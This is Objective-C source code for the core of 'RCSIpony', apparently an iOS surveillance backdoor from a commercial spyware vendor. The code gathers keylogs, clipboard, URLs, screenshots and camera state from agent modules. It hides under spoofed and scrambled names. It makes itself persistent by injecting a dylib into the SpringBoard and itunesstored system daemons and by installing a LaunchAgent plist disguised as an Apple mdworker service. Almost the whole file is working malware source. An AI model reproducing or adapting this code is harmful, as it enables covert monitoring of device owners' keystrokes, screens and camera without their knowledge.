/*
 * RCSIpony - Core
 *  pon pon
 *
 *
 * Created by Alfredo 'revenge' Pesoli on 07/09/2009
 * Copyright (C) HT srl 2009. All rights reserved
 *
 */

#import <CommonCrypto/CommonDigest.h>
#import <sys/ioctl.h>
#import <fcntl.h>
#import <sys/socket.h>
#import <sys/un.h>

#import "RCSICore.h"
#import "RCSIUtils.h"
#import "RCSICommon.h"
#import "RCSILogManager.h"
#import "RCSITaskManager.h"
#import "RCSIEncryption.h"
#import "RCSIInfoManager.h"

#import "NSString+ComparisonMethod.h"

//#define DEBUG

#define VERSION             "0.9.0"
#define GLOBAL_PERMISSIONS  0666

#pragma mark -
#pragma mark Private Interface
#pragma mark -

RCSISharedMemory  *mSharedMemoryCommand;
RCSISharedMemory  *mSharedMemoryLogging;

@interface RCSICore (hidden)

//
// Main core routine which will receive logs from shared memory
//
- (void)_communicateWithAgents;

//
// Used for guessing all the required names (e.g. update, conf...)
//
- (void)_guessNames;

@end

#pragma mark -
#pragma mark Private Implementation
#pragma mark -

@implementation RCSICore (hidden)

#define IS_HEADER_MANDATORY(x) ((x & 0xFFFF0000))

- (BOOL)syncSharedMemoryLogging:(NSMutableData *)aData
{
  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
  
  RCSILogManager *_logManager = [RCSILogManager sharedInstance];
   
  shMemoryLog *shMemLog = (shMemoryLog *)[aData bytes];
  
  NSMutableData *payload;

  if (shMemLog->agentID == LOG_KEYLOG)
    {
      if (IS_HEADER_MANDATORY(shMemLog->flag))
        {
          payload = [NSMutableData dataWithBytes: shMemLog->commandData 
                                          length: shMemLog->commandDataSize];
        }
      else
        {
          int off = (shMemLog->flag & 0x0000FFFF);
          payload = [NSMutableData dataWithBytes: shMemLog->commandData + off 
                                                   length: shMemLog->commandDataSize - off];
        }
    }
  else
    {
      payload = [NSMutableData dataWithBytes: shMemLog->commandData
                                      length: shMemLog->commandDataSize];
    }
    
  if ([_logManager writeDataToLog: payload
                         forAgent: shMemLog->agentID
                        withLogID: shMemLog->logID] == FALSE)
    {
      // log streaming closed by sync: recreate and append whole log
      if ([_logManager createLog:shMemLog->agentID 
                     agentHeader:nil 
                       withLogID:shMemLog->logID])
        {
          if (shMemLog->agentID == LOG_KEYLOG)
            {
              payload = [NSMutableData dataWithBytes: shMemLog->commandData
                                              length: shMemLog->commandDataSize];
            }
                                                    
          [_logManager writeDataToLog:payload 
                             forAgent:shMemLog->agentID
                            withLogID:shMemLog->logID];
        }
    }
  
  [pool release];
  
  return TRUE;
}

- (void)_communicateWithAgents
{
  shMemoryLog *shMemLog;
  RCSILogManager *_logManager = [RCSILogManager sharedInstance];
  
  while (mMainLoopControlFlag != @"STOP")
    {
      NSMutableData *readData;
    
      NSAutoreleasePool *innerPool = [[NSAutoreleasePool alloc] init];
    
      readData = [mSharedMemoryLogging readMemoryFromComponent: COMP_CORE 
                                                      forAgent: 0 
                                               withCommandType: CM_LOG_DATA | CM_CREATE_LOG_HEADER | CM_CLOSE_LOG];
    
    if (readData != nil)
        {
          shMemLog = (shMemoryLog *)[readData bytes];
          
          switch (shMemLog->agentID)
            {
            case LOG_URL:
            case LOG_APPLICATION:
            case LOG_CLIPBOARD:
            case LOG_KEYLOG:
              {
                [self syncSharedMemoryLogging: readData];
                break;
              }
            case LOG_SNAPSHOT:
              {
                NSMutableData *scrData = [[NSMutableData alloc] initWithBytes: shMemLog->commandData
                                                                       length: shMemLog->commandDataSize];
                
                if (shMemLog->commandType == CM_CREATE_LOG_HEADER) 
                  {
                    [_logManager createLog: LOG_SNAPSHOT
                               agentHeader: scrData
                                 withLogID: shMemLog->logID];
                  }
                else
                  {
                    [self syncSharedMemoryLogging: readData];
                    if (shMemLog->commandType == CM_CLOSE_LOG) 
                        [_logManager closeActiveLog: LOG_SNAPSHOT
                                          withLogID: shMemLog->logID];
                  }
                  
                [scrData release];
                break;
              }  
            case EVENT_STANDBY:
              {
                RCSITaskManager *taskManager = [RCSITaskManager sharedInstance];
                
                if (shMemLog->flag != CONF_ACTION_NULL)                   
                  [taskManager triggerAction: shMemLog->flag];                
                break;
              }
            case AGENT_CAM:
              {             
                if (shMemLog->flag == 1)
                    gCameraActive = TRUE;
                else if (shMemLog->flag == 2)
                    gCameraActive = FALSE;
             
                break;
              }

          }
          
          [readData release];
        }
      
      [[NSRunLoop currentRunLoop] runUntilDate:[NSDate dateWithTimeIntervalSinceNow: 0.080]]; 
      
      [innerPool release];
    }
}

- (void)_guessNames
{
#ifdef DEV_MODE
  unsigned char result[CC_MD5_DIGEST_LENGTH];
  CC_MD5(gConfAesKey, strlen(gConfAesKey), result);
  
  NSData *temp = [NSData dataWithBytes: result
                                length: CC_MD5_DIGEST_LENGTH];
#else
  NSData *temp = [NSData dataWithBytes: gConfAesKey
                                length: CC_MD5_DIGEST_LENGTH];
#endif
  
  RCSIEncryption *_encryption = [[RCSIEncryption alloc] initWithKey: temp];
  gBackdoorName = [[[NSBundle mainBundle] executablePath] lastPathComponent];
  
  //
  // Here we should calculate the lowest scrambled name in order to obtain
  // the configuration name
  //
  gBackdoorUpdateName = [_encryption scrambleForward: gBackdoorName
                                                seed: ALPHABET_LEN / 2];
  
  if ([gBackdoorName isLessThan: gBackdoorUpdateName])
    {
      gConfigurationName = [_encryption scrambleForward: gBackdoorName
                                                   seed: 1];
    }
  else
    {
      gConfigurationName = [_encryption scrambleForward: gBackdoorUpdateName
                                                   seed: 1];
    }
  
  gConfigurationUpdateName = [_encryption scrambleForward: gConfigurationName
                                                     seed: ALPHABET_LEN / 2];
  
  gDylibName = [_encryption scrambleForward: gConfigurationName
                                       seed: 2];
}

@end

////////////////////////////////////////////////////////////////////////////

#pragma mark -
#pragma mark Public Implementation
#pragma mark -

@implementation RCSICore

@synthesize mBackdoorFD;
@synthesize mBackdoorID;
@synthesize mLockFD;
@synthesize mBinaryName;
@synthesize mApplicationName;
@synthesize mSpoofedName;
@synthesize mMainLoopControlFlag;
@synthesize mUtil;


- (id)initWithKey: (int)aKey
 sharedMemorySize: (int)aSize
    semaphoreName: (NSString *)aSemaphoreName
{
  self = [super init];
  
  if (self != nil)
    {
      self.mBackdoorFD      = 0;
      self.mBackdoorID      = 0;
      self.mApplicationName = [[[NSBundle mainBundle] executablePath] lastPathComponent];
      self.mBinaryName      = [[[NSBundle mainBundle] executablePath] lastPathComponent];
      self.mSpoofedName     = [[[[NSBundle mainBundle] executablePath] stringByDeletingLastPathComponent]
                               stringByAppendingPathComponent: @"Umpa Lumpa"];
      
      mSharedMemoryCommand = [[RCSISharedMemory alloc] initWithFilename: SH_COMMAND_FILENAME
                                                                   size: aSize];
      
      mSharedMemoryLogging = [[RCSISharedMemory alloc] initWithFilename: SH_LOG_FILENAME
                                                                   size: SHMEM_LOG_MAX_SIZE];
      
      //
      // Let's guess all the required names
      //
      [self _guessNames];
      
      NSString *kextPath = [[NSString alloc] initWithFormat: @"%@/%@",
                            [[NSBundle mainBundle] bundlePath],
                            @"Contents/Resources"];
      NSString *loaderPath = [[NSString alloc] initWithFormat: @"%@/%@",
                              [[NSBundle mainBundle] bundlePath],
                              @"srv.sh"];
      NSString *flagPath   = [[NSString alloc] initWithFormat: @"%@/%@",
                              [[NSBundle mainBundle] bundlePath],
                              @"mdworker.flg"];
#ifdef NOT_USED
      mUtil = [[RCSIUtils alloc] initWithBackdoorPath: [[NSBundle mainBundle] bundlePath]
                                             kextPath: [[NSBundle mainBundle] pathForResource: @"mchook"
                                                                                       ofType: @"kext"]
                                         SLIPlistPath: SLI_PLIST
                                        serviceLoader: @"srv.sh"
                                             execFlag: @"mdworker.flg"];
#else
      mUtil = [[RCSIUtils alloc] initWithBackdoorPath: [[NSBundle mainBundle] bundlePath]
                                             kextPath: kextPath
                                         SLIPlistPath: SLI_PLIST
                                        serviceLoader: loaderPath
                                             execFlag: flagPath];
#endif
      
      [kextPath release];
      [loaderPath release];
      [flagPath release];
    }
  
  return self;
}

- (void)dealloc
{
  [mSharedMemoryCommand release];
  [mSharedMemoryLogging release];
  
  [mUtil release];
  
  [mMainLoopControlFlag release];
  
  if (mBackdoorFD != 0)
    {
      close (mBackdoorFD);
    }
  
  [super dealloc];
}

- (BOOL)makeBackdoorResident
{ 
  NSString *sbPathname = @"/System/Library/LaunchDaemons/com.apple.SpringBoard.plist";
  NSString *itPathname = @"/System/Library/LaunchDaemons/com.apple.itunesstored.plist";
  
#ifdef DEBUG
  debugLog(ME, @"makeBackdoorResident: serviceLoader (%@)", [mUtil mServiceLoaderPath]);
#endif
  
  if ([mUtil createBackdoorLoader] == NO) 
    {
#ifdef DEBUG
      errorLog(ME, @"makeBackdoorResident: an error occured while writing the serviceLoader");
#endif 
      return NO;
    }
  
  // Dylib injection
  if (injectDylib(sbPathname) == NO)
    {
#ifdef DEBUG
      errorLog(ME, @"error on dylib injection");
#endif
    }
  // Dylib injection
  if (injectDylib(itPathname) == NO)
    {
#ifdef DEBUG
      errorLog(ME, @"error on dylib injection");
#endif
    }
  else 
    {
      system("launchctl unload \"/System/Library/LaunchDaemons/com.apple.itunesstored.plist\"; launchctl load \"/System/Library/LaunchDaemons/com.apple.itunesstored.plist\"");
    }

  
  return [mUtil createLaunchAgentPlist: @"com.apple.mdworker"];
}

- (BOOL)isBackdoorAlreadyResident
{
  if ([[NSFileManager defaultManager] fileExistsAtPath: BACKDOOR_DAEMON_PLIST
                                           isDirectory: NULL])
    return YES;
  else
    return NO;
}

- (BOOL)runMeh
{
  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
  
  RCSITaskManager *taskManager = [RCSITaskManager sharedInstance]; 
  
  // Set the backdoorControlFlag to RUNNING
  mMainLoopControlFlag = @"RUNNING";
  taskManager.mBackdoorControlFlag = mMainLoopControlFlag;
  
  //
  // Lock to prevent more instance of running backdoor
  //
  if ((gLockSock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)) != -1) 
    {
      struct sockaddr_in l_addr;   
      
      memset(&l_addr, 0, sizeof(l_addr));
      l_addr.sin_family = AF_INET;
      l_addr.sin_port = htons(37173);
      l_addr.sin_addr.s_addr = inet_addr("127.0.0.1");
      
      if ((bind(gLockSock, (struct sockaddr *)&l_addr, sizeof(l_addr)) == -1) && 
          errno == EADDRINUSE) 
        {
#ifdef DEBUG
          NSLog(@"%s: cannot bind socket, instance already running, errno %d", __FUNCTION__, errno);
#endif
          [pool release];
          exit(-1);
        }
    }
  else
    {
#ifdef DEBUG
      NSLog(@"%s: error create socket, [%d] could not check running instance", __FUNCTION__, gLockSock);
#endif
    }
      
  //
  // Get system version in global variables
  //
  getSystemVersion(&gOSMajor, &gOSMinor, &gOSBugFix);

#ifdef DEBUG
  NSLog(@"Found iOS ver %d.%d.%d", gOSMajor, gOSMinor, gOSBugFix);
#endif
    
  //
  // Create and initialize the shared memory segments
  // for commands and logs
  //
  if ([mSharedMemoryCommand createMemoryRegion] == -1)
    return NO;
    
  if ([mSharedMemoryCommand attachToMemoryRegion: YES] == -1)
    return NO;
  
  [mSharedMemoryCommand zeroFillMemory];
  
  if ([mSharedMemoryLogging createMemoryRegion] == -1)
    return NO;

  if ([mSharedMemoryLogging attachToMemoryRegion: YES] == -1)
    return NO;
  
  [mSharedMemoryLogging zeroFillMemory];
  
  if ([self isBackdoorAlreadyResident] == FALSE)
    {
      if ([self makeBackdoorResident] == FALSE)
        {
#ifdef DEBUG
          errorLog(ME, @"[makeBackdoorResident] An error occurred");
#endif        
        }
      else
        {
#ifdef DEBUG        
          infoLog(ME, @"[makeBackdoorResident] successful");
#endif
        }
    }
  
  // If resident configuration is invalid core exit immediately
  if ([taskManager loadInitialConfiguration])
    {
#ifdef DEBUG
      NSLog(@"%s: configuration loaded and running",__FUNCTION__);
#endif
    }
  
  // Start enabled agents
  [taskManager startAgents];
  
  // Start events monitor
  [taskManager startEvents];
  
  RCSIInfoManager *infoManager = [[RCSIInfoManager alloc] init];
  [infoManager logActionWithDescription: @"Start"];
  [infoManager release];

  //
  // Main backdoor loop
  //
  [self _communicateWithAgents];
  
  [pool release];
  
  return YES;
}

@end


